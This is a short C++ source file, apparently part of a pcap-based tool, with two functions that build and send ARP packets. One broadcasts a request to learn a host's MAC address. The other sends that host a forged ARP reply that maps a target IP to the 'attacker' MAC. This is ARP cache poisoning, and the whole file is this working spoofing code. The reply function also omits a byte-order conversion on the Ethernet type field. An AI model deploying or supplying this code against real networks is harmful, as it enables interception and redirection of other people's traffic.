#include "arp.h"

void arp_request(Mac attacker_mac, Ip attacker_ip, Ip sender_ip, pcap_t *handle) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = Mac(attacker_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(attacker_mac);
    packet.arp_.sip_ = htonl(Ip(attacker_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if(res != 0) {
        fprintf(stderr, "[pcap_sendpacket return %d error=%s]\n", res, pcap_geterr(handle));
    }
}

void arp_reply(Mac attacker_mac, Mac sender_mac, Ip sender_ip, Ip target_ip, pcap_t* handle) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(sender_mac);
    packet.eth_.smac_ = Mac(attacker_mac);
    packet.eth_.type_ = EthHdr::Arp;

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(attacker_mac);
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = Mac(sender_mac);
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if(res != 0) {
        fprintf(stderr, "[pcap_sendpacket return %d error=%s]\n", res, pcap_geterr(handle));
    }
}
